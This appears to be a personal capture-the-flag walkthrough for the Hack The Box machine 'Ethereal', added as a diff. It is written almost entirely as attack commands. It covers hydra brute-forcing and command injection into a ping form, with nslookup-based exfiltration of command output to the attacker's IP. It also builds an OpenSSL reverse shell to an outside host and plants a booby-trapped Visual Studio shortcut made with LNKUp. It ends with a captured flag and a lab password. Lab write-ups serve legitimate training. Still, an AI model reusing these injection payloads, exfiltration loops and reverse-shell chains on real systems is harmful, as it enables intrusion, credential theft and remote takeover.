@@ -1,0 +1,174 @@
+#10.10.10.106
+PORT- 21, 80, 8080
+
+#add into host file - ethereal.htb
+#search website
+#username found inside 'Notes'
+#USER= Alan
+
+#dirb -->  /corp
+#ftp --> anonymous
+#found FDISK.zip on ftp
+binary
+get FDISK.zip
+
+#after downloading
+file FDISK
+#this is an 'DOS/MBR boot sector'
+#now need to mount FDISK
+#create mnt folder in '/root/Documents/htb/Ethereal (win)/mnt'
+mkdir /root/Documents/htb/"Ethereal (win)"/mnt/
+mkdir /root/Documents/htb/"Ethereal (win)"/mnt/fdisk/
+
+#mount FDISK into /root/Documents/htb/Ethereal (win)/mnt/fdisk/
+mount FDISK /mnt/fdisk
+   
+#there are two files inside FDISK mount partition pbox.exe, pbox.bat
+#analyse that with DOSBOX
+#install DOSBOX
+#it required CWSDPMI file to analyse pbox.exe
+>>>https://www.dosgames.com/files/cwsdpmi.zip
+#past this file into /mnt/fdisk/CWSDPMI.exe     [CWS DPMI (DOS Protected Mode Interface]
+dosbox CWSDPMI.exe	(run this from where CWSDPMI.exe is: -/Ethereal (win)/mnt/fdisk/)
+#now analyse files
+type pbox.dat   	(found -->  PasswordBox)
+type pbox.exe
+pbox.exe
+#PASSWD= password
+
+#found lots of username and passwd
+#create a passwd.list file and store every passwd into this
+#bruteforce into http://ethereal.htb:8080
+hydra -L user.list -P passwd.list http-get://ethereal.htb:8080
+#found credentials
+#USER= alan		(cred for webpage http://ethereal.htb:8080)
+#PASSWD= !C414m17y57r1k3s4g41n!
+
+
+--------------------------------------------
+#ON WEBPAGE ADMIN PANEL (PING IP)
+--------------------------------------------
+#here we can ping ip address
+#test it by putting your tun0 IP on admin panel
+#start tcpdump
+tcpdump -i tun0 icmp
+#we got some 'ICMP echo' packet, so it is pingin the address
+
+#let's check is there cmd execution
+#run this on webpage
+|| ping 10.10.14.224 -n 11		
+#if this cmd will respond after 10 sec than there is cmd execution
+	OR
+#use tcpdump to see packet
+tcpdump -i tun0 icmp
+#so there is RCE
+
+#now try to do an nslookup there 
+#before that use responder to listen
+responder -i 10.10.14.144 -I tun0 -r On -v -f On
+
+#run this on webpage
+127.0.0.1 & nslookup hello.com 10.10.14.224
+#check output into responder
+#This shows that we can use webpage to exfiltrate information from the target computer by replacing hello.com with a string
+#now run
+127.0.0.1 & for /f %i in ('whoami') do nslookup %i 10.10.14.224
+#the result should be in this format 'domain\user'(ethereal\alan) but we got ehterealalan , so there is blind RCE
+#know more about blind_rce
+>>>https://security.stackexchange.com/questions/141846/verify-blind-code-execution-works
+
+
+127.0.0.1 & for /f "tokens=2" %i in ('echo test 123') do nslookup %i 10.10.14.144
+#further process to know that there is blind RCE,check pdf  
+-->  "wilsonnkwan - Ethereal.pdf"     [page 7-9]
+
+#run this on webpage to print directories inside 'program filses (x86)'
+127.0.0.1 & for /f "tokens=1,2,3" %a in ('dir /B "C:\Program Files (x86)"') do nslookup %a.%b.%c 10.10.14.94
+#so there is 'openssl' availabe on windows server check writeup pdf   
+-->  "wilsonnkwan - Ethereal.pdf"     [page 10-11]
+
+#We can use openssl to get a remote command execution. But any attempts will fail because there is some firewall that is blocking the outgoing signal
+
+#firewall enumration on webpage to check which port are open
+#first runnnig the cmd to check firewall rule and saving output on some file inside 'c:\users\public\desktop\shortcuts\' folder
+127.0.0.1 & netsh advfirewall firewall show rule name=all|findstr "Rule Name:"|findstr "Allow" > C:\users\public\desktop\shortcuts\firewall_rules
+#now checking the file
+127.0.0.1 & for /f "tokens=1,2,3,4,5,6,7,8" %a in ('type c:\users\public\desktop\shortcuts\firewall_rules') do nslookup %a.%b.%c.%d.%e.%f.%g.%h 10.10.14.94
+
+#for more information about firewall enumration, check pdf
+-->  "wilsonnkwan - Ethereal.pdf"     [page 12-15]
+
+#check response inside responder
+#So Tcp port 73 & 136 are open
+
+{#this cmd can be used to open rdp
+( netsh advfirewall firewall add rule name="Open Port 3389" dir=in action=allow protocol=TCP localport=3389 ) }
+
+---------------------------------------
+#GETTING SHELL WITH OPENSSL
+---------------------------------------
+#reverse shell via openssl
+>>>https://medium.com/@honze_net/openssl-reverse-shell-with-certificate-pinning-e0955c37b4a7
+
+#Create a certificate on local machine
+openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
+
+#run these cmd in the same folder where you created your certificates	
+#Start the listener on different terminals of local machine
+openssl s_server -quiet -key key.pem -cert cert.pem -port 73     
+openssl s_server -quiet -key key.pem -cert cert.pem -port 136
+#The 's_server' command implements a generic SSL/TLS server which listens for connections on a given port using SSL/TLS.
+
+#run this on webpage everytime while executing cmd  (in below cmd 'Progra~2' == 'Program files (x86)' folder)
+127.0.0.1|C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.94:73|cmd.exe|C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.94:136
+
+#here whatever the cmd we will put into terminal(port 73) it will redirect to cmd.exe for execution then output will be shown into another terminal(port 136)
+
+---------------------------------------------------------
+#GOT SHELL 
+---------------------------------------------------------
+#type cmd inside terminal(port 73) 
+#execute cmd through webpage by entering above cmd again and again
+#get result into terminal(port 136)
+
+#found one file inside 'c:\users\alan\desktop\note-draft.txt'
+``` I've created a shortcut for VS on the Public Desktop to ensure we use the same version. Please delete any existing shortcuts and use this one instead.
+- Alan ```
+
+#check the directory
+c:\users\public\desktop\shortcuts  -->  "Visual Studio 2017.lnk"
+
+#now we will create our own .lnk file with same name
+
+#download the Linkup to create file inside "Ethereal (win)" folder
+>>>https://github.com/Plazmaz/LNKUp
+
+#run these into '/root/Documents/htb/"Ethereal (win)"/LNKUp-master'
+pip install -r requirements.txt
+python generate.py --host localhost --type ntlm --output out.lnk --execute "C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.94:73|cmd.exe|C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.94:136"
+
+#copy out.lnk to "Visual Studio 2017.lnk"
+cp out.lnk "Visual Studio 2017.lnk"
+
+#upload this on server
+#1st run this cmd on one terminal in "Ethereal (win)" folder
+openssl s_server -quiet -key key.pem -cert cert.pem -port 73
+#2nd run this cmd on other terminal in "Ethereal (win)" folder
+openssl s_server -quiet -key key.pem -cert cert.pem -port 136 < "Visual Studio 2017.lnk"
+#3rd run this on webpage
+127.0.0.1|C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.94:73|cmd.exe|C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.94:136>"c:\users\public\desktop\shortcuts\Visual Studio 2017.lnk"
+
+#after cmd is executed stop the both terminal and execute these cmd again on different terminal 
+#and wait for some time
+openssl s_server -quiet -key key.pem -cert cert.pem -port 73
+openssl s_server -quiet -key key.pem -cert cert.pem -port 136
+
+#we'll get the terminal with user jorge "C:\Users\jorge\Documents\"
+#type in termina(port 73)
+type c:\users\jorge\desktop\user.txt
+#got key in other terminal(port 136)
+
+
+#key
+2b9a4ca09408b4a39d87cbcd7bd524dd
+
